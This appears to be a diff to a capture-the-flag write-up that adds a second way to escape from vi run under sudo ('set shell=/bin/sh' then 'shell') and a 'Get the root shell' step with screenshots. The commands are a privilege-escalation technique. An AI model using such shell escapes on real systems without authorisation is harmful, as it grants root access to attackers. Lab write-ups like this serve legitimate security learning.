@@ -158,11 +158,21 @@ sudo /usr/bin/vi /var/www/html/test
 
 # on vi editor:
 :!bash
+
+# alternatively, on vi:
+:set shell=/bin/sh
+:shell
 ```
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e815cb80-6768-44e3-b989-e788070d7042)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9f9f5417-4313-4712-9274-ac6d79c0fddc)
+
++ Get the root shell.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/76d933d0-4615-4ef0-9f2b-f292e566ab5e)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d5564321-38c6-4cd2-85ca-143258068944)
 
 
 # Technical Knowledge
